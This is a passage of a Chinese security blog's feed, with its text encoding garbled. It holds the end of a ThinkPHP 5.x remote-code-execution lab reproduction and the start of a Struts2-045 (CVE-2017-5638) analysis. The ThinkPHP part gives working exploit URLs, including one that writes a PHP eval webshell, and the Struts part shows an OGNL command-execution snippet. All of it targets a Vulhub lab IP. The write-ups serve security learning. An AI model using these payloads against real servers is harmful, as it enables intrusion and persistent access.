&lt;p&gt;Web æœåŠ¡è¿è¡Œç”¨æˆ·ä¸è¦ä½¿ç”¨ &lt;code&gt;root&lt;/code&gt;ï¼Œé™åˆ¶æ–‡ä»¶è®¿é—®æƒé™ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;éƒ¨ç½² WAF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ‹¦æˆªè¯·æ±‚ä¸­åŒ…å«æ•æ„Ÿå‡½æ•°æˆ–è·¯å¾„çš„æ”»å‡»å°è¯•ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;å®‰å…¨å®¡è®¡ä¸ç›‘æ§&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å®šæœŸæ‰«æã€æ—¥å¿—å®¡è®¡ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸ºã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ä¸ƒã€ç¬”è®°æ€»ç»“&#34;&gt;&lt;a href=&#34;#ä¸ƒã€ç¬”è®°æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;ä¸ƒã€ç¬”è®°æ€»ç»“&#34;&gt;&lt;/a&gt;ä¸ƒã€ç¬”è®°æ€»ç»“&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å†…å®¹é¡¹&lt;/th&gt;
&lt;th&gt;ä¿¡æ¯&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;æ¼æ´ç±»å‹&lt;/td&gt;
&lt;td&gt;RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å½±å“ç‰ˆæœ¬&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.0.x è‡³ 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æ¼æ´åŸå› &lt;/td&gt;
&lt;td&gt;åŠ¨æ€å‡½æ•°è°ƒç”¨ç¼ºä¹æˆæƒæ ¡éªŒ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å¤ç°æ–¹å¼&lt;/td&gt;
&lt;td&gt;URL GET è¯·æ±‚æ„é€  Payload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¯å¢ƒå·¥å…·&lt;/td&gt;
&lt;td&gt;Vulhubã€Dockerã€Kali Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å…«ã€é™„åŠ ç©æ³•&#34;&gt;&lt;a href=&#34;#å…«ã€é™„åŠ ç©æ³•&#34; class=&#34;headerlink&#34; title=&#34;å…«ã€é™„åŠ ç©æ³•&#34;&gt;&lt;/a&gt;å…«ã€é™„åŠ ç©æ³•&lt;/h2&gt;&lt;h3 id=&#34;è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬&#34;&gt;&lt;a href=&#34;#è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬&#34; class=&#34;headerlink&#34; title=&#34;è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬&#34;&gt;&lt;/a&gt;è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;response = requests.get(url)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;www-data&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Vulnerability found!&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No vulnerability detected.&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ä¸Šä¼ -WebShell&#34;&gt;&lt;a href=&#34;#ä¸Šä¼ -WebShell&#34; class=&#34;headerlink&#34; title=&#34;ä¸Šä¼  WebShell&#34;&gt;&lt;/a&gt;ä¸Šä¼  WebShell&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ä½¿ç”¨èšå‰‘è¿æ¥ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.102:8080/shell.php&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ææƒå°è¯•&#34;&gt;&lt;a href=&#34;#ææƒå°è¯•&#34; class=&#34;headerlink&#34; title=&#34;ææƒå°è¯•&#34;&gt;&lt;/a&gt;ææƒå°è¯•&lt;/h3&gt;&lt;p&gt;ç»“åˆå¼±å£ä»¤ã€ææƒæ¼æ´ç­‰ï¼Œå¯ä½¿ç”¨ Metasploit ç­‰å·¥å…·è¿›ä¸€æ­¥å…¥ä¾µã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ä¹ã€æ€»ç»“&#34;&gt;&lt;a href=&#34;#ä¹ã€æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;ä¹ã€æ€»ç»“&#34;&gt;&lt;/a&gt;ä¹ã€æ€»ç»“&lt;/h2&gt;&lt;p&gt;ThinkPHP 5.x RCE æ¼æ´æ˜¯ä¸€ä¸ªå…¸å‹çš„åŠ¨æ€å‡½æ•°è°ƒç”¨æ¼æ´ï¼Œåˆ©ç”¨ç®€å•ä½†å±å®³æå¤§ã€‚é€šè¿‡ Vulhub é¶åœºï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿå¤ç°æ¼æ´ï¼Œæ·±å…¥ç†è§£å…¶åŸç†å’Œåˆ©ç”¨æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;å¼€å‘è€…åº”åŠæ—¶å‡çº§æ¡†æ¶ç‰ˆæœ¬ï¼Œå®æ–½ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œæƒé™æ§åˆ¶ï¼Œéƒ¨ç½² WAF å’Œç›‘æ§æœºåˆ¶ï¼Œä»¥é™ä½æ¼æ´è¢«åˆ©ç”¨çš„é£é™©ã€‚&lt;/p&gt;
&lt;p&gt;å¸Œæœ›æœ¬æ–‡èƒ½å¸®åŠ©è¯»è€…æ›´å¥½åœ°ç†è§£å’Œé˜²èŒƒ ThinkPHP RCE æ¼æ´ï¼ŒåŒæ—¶æå‡ Web åº”ç”¨å®‰å…¨å¼€å‘çš„æ„è¯†ï¼&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;âš ï¸-å…è´£å£°æ˜&#34;&gt;&lt;a href=&#34;#âš ï¸-å…è´£å£°æ˜&#34; class=&#34;headerlink&#34; title=&#34;âš ï¸ å…è´£å£°æ˜&#34;&gt;&lt;/a&gt;âš ï¸ å…è´£å£°æ˜&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡å†…å®¹ä»…ä¾›ç½‘ç»œå®‰å…¨å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•ä¸ªäººæˆ–ç»„ç»‡ä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œçš„è¿æ³•æ´»åŠ¨ï¼Œå‡ä¸ä½œè€…æ— å…³ã€‚è¯»è€…åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œåœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ã€‚&lt;/p&gt;
</content>
        <category term="Webå®‰å…¨" />
        <category term="RCE" />
        <category term="æ¼æ´å¤ç°" />
        <category term="ThinkPHP" />
        <updated>2025-07-27T09:25:25.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
        <title>Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;h1 id=&#34;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34;&gt;&lt;a href=&#34;#Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34;&gt;&lt;/a&gt;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&lt;/h1&gt;&lt;h2 id=&#34;æ¼æ´æ¦‚è¿°&#34;&gt;&lt;a href=&#34;#æ¼æ´æ¦‚è¿°&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´æ¦‚è¿°&#34;&gt;&lt;/a&gt;æ¼æ´æ¦‚è¿°&lt;/h2&gt;&lt;p&gt;Struts2-045ï¼ˆCVE-2017-5638ï¼‰æ˜¯Apache Struts2æ¡†æ¶ä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å› å…¶å½±å“èŒƒå›´å¹¿ã€åˆ©ç”¨ç®€å•è€Œå¤‡å—å…³æ³¨ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„Content-Typeè¯·æ±‚å¤´ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´åŸºæœ¬ä¿¡æ¯&#34;&gt;&lt;a href=&#34;#æ¼æ´åŸºæœ¬ä¿¡æ¯&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´åŸºæœ¬ä¿¡æ¯&#34;&gt;&lt;/a&gt;æ¼æ´åŸºæœ¬ä¿¡æ¯&lt;/h2&gt;&lt;h3 id=&#34;å½±å“ç‰ˆæœ¬&#34;&gt;&lt;a href=&#34;#å½±å“ç‰ˆæœ¬&#34; class=&#34;headerlink&#34; title=&#34;å½±å“ç‰ˆæœ¬&#34;&gt;&lt;/a&gt;å½±å“ç‰ˆæœ¬&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.3.5 - 2.3.31&lt;/strong&gt;ï¼ˆåŒ…å«2.3.31ç‰ˆæœ¬ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.5.0 - 2.5.10&lt;/strong&gt;ï¼ˆåŒ…å«2.5.10ç‰ˆæœ¬ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ¼æ´ç­‰çº§&#34;&gt;&lt;a href=&#34;#æ¼æ´ç­‰çº§&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´ç­‰çº§&#34;&gt;&lt;/a&gt;æ¼æ´ç­‰çº§&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVSSè¯„åˆ†&lt;/strong&gt;: 10.0ï¼ˆä¸¥é‡ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´ç±»å‹&lt;/strong&gt;: è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ”»å‡»å¤æ‚åº¦&lt;/strong&gt;: ä½&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ ¸å¿ƒåŸç†&#34;&gt;&lt;a href=&#34;#æ ¸å¿ƒåŸç†&#34; class=&#34;headerlink&#34; title=&#34;æ ¸å¿ƒåŸç†&#34;&gt;&lt;/a&gt;æ ¸å¿ƒåŸç†&lt;/h3&gt;&lt;p&gt;Struts2æ¡†æ¶åœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ—¶ï¼Œä¼šè§£æContent-Typeè¯·æ±‚å¤´ã€‚å½“Content-Typeæ ¼å¼ä¸æ­£ç¡®æ—¶ï¼Œæ¡†æ¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œ&lt;strong&gt;å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ä¼šå¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æ&lt;/strong&gt;ï¼Œè¿™å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚&lt;/p&gt;
&lt;h2 id=&#34;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34;&gt;&lt;a href=&#34;#æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34;&gt;&lt;/a&gt;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&lt;/h2&gt;&lt;h3 id=&#34;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34;&gt;&lt;a href=&#34;#OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34; class=&#34;headerlink&#34; title=&#34;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34;&gt;&lt;/a&gt;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OGNLï¼ˆObject-Graph Navigation Languageï¼‰&lt;/strong&gt; æ˜¯Struts2æ¡†æ¶ä½¿ç”¨çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨Javaå¯¹è±¡ä¹‹é—´è¿›è¡Œå¯¼èˆªå’Œæ“ä½œã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// OGNLè¡¨è¾¾å¼ç¤ºä¾‹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-id&#34;&gt;#context&lt;/span&gt;&lt;span class=&#34;hljs-selector-attr&#34;&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;xwork.MethodAccessor.denyMethodExecution&amp;#x27;&lt;/span&gt;]&lt;/span&gt; = false&lt;br&gt;@java&lt;span class=&#34;hljs-selector-class&#34;&gt;.lang&lt;/span&gt;.Runtime@&lt;span class=&#34;hljs-built_in&#34;&gt;getRuntime&lt;/span&gt;()&lt;span class=&#34;hljs-selector-class&#34;&gt;.exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æ¼æ´è§¦å‘æµç¨‹&#34;&gt;&lt;a href=&#34;#æ¼æ´è§¦å‘æµç¨‹&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´è§¦å‘æµç¨‹&#34;&gt;&lt;/a&gt;æ¼æ´è§¦å‘æµç¨‹&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;è¯·æ±‚æ¥æ”¶&lt;/strong&gt;: æœåŠ¡å™¨æ¥æ”¶åŒ…å«æ¶æ„Content-Typeçš„HTTPè¯·æ±‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç±»å‹è§£æ&lt;/strong&gt;: Struts2å°è¯•è§£æContent-Typeå¤´éƒ¨ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å¼‚å¸¸è§¦å‘&lt;/strong&gt;: æ¶æ„æ„é€ çš„Content-Typeå¯¼è‡´è§£æå¼‚å¸¸&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é”™è¯¯å¤„ç†&lt;/strong&gt;: å¼‚å¸¸å¤„ç†å™¨å¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè§£æ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä»£ç æ‰§è¡Œ&lt;/strong&gt;: æ¶æ„OGNLè¡¨è¾¾å¼è¢«æ‰§è¡Œï¼Œå®ç°RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å…³é”®æºç åˆ†æ&#34;&gt;&lt;a href=&#34;#å…³é”®æºç åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;å…³é”®æºç åˆ†æ&#34;&gt;&lt;/a&gt;å…³é”®æºç åˆ†æ&lt;/h3&gt;&lt;p&gt;æ¼æ´ä½äº&lt;code&gt;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&lt;/code&gt;ç±»ä¸­ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç®€åŒ–çš„æ¼æ´ä»£ç é€»è¾‘&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;buildErrorMessage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-title class_&#34;&gt;Throwable&lt;/span&gt; e, &lt;span class=&#34;hljs-title class_&#34;&gt;Object&lt;/span&gt;[] args&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt; errorMessage = localizedTextProvider.&lt;span class=&#34;hljs-title function_&#34;&gt;findDefaultText&lt;/span&gt;(e.&lt;span class=&#34;hljs-title function_&#34;&gt;getMessage&lt;/span&gt;(), locale, args);&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// è¿™é‡Œä¼šå¯¹errorMessageè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œå¯¼è‡´RCE&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (errorMessage != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        errorMessage = &lt;span class=&#34;hljs-title class_&#34;&gt;TextParseUtil&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;translateVariables&lt;/span&gt;(errorMessage, stack);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;å®éªŒç¯å¢ƒæ­å»º&#34;&gt;&lt;a href=&#34;#å®éªŒç¯å¢ƒæ­å»º&#34; class=&#34;headerlink&#34; title=&#34;å®éªŒç¯å¢ƒæ­å»º&#34;&gt;&lt;/a&gt;å®éªŒç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;h3 id=&#34;ç³»ç»Ÿæ¶æ„&#34;&gt;&lt;a href=&#34;#ç³»ç»Ÿæ¶æ„&#34; class=&#34;headerlink&#34; title=&#34;ç³»ç»Ÿæ¶æ„&#34;&gt;&lt;/a&gt;ç³»ç»Ÿæ¶æ„&lt;/h3&gt;&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;â”Œâ”€ æ”»å‡»æœºï¼ˆHostï¼‰&lt;br&gt;â”‚  â””â”€ Windows&lt;span class=&#34;hljs-symbol&#34;&gt;/Linux&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; BurpSuite&lt;br&gt;â”‚&lt;br&gt;â””â”€ é¶æœºï¼ˆKali VMï¼‰&lt;br&gt;   â”œâ”€ &lt;span class=&#34;hljs-params&#34;&gt;IP:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;&lt;br&gt;   â”œâ”€ Docker &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; Vulhub&lt;br&gt;   â””â”€ Struts2 App (Port &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Dockerç¯å¢ƒéƒ¨ç½²&#34;&gt;&lt;a href=&#34;#Dockerç¯å¢ƒéƒ¨ç½²&#34; class=&#34;headerlink&#34; title=&#34;Dockerç¯å¢ƒéƒ¨ç½²&#34;&gt;&lt;/a&gt;Dockerç¯å¢ƒéƒ¨ç½²&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1. å…‹éš†Vulhubé¡¹ç›®&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 2. è¿›å…¥S2-045ç›®å½•&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/struts2/s2-045&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 3. å¯åŠ¨é¶åœº&lt;/span&gt;&lt;br&gt;docker-compose up -d&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 4. éªŒè¯å®¹å™¨çŠ¶æ€&lt;/span&gt;&lt;br&gt;docker ps -a&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;é¢„æœŸè¾“å‡º&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CONTAINER&lt;/span&gt; ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES&lt;br&gt;&lt;span 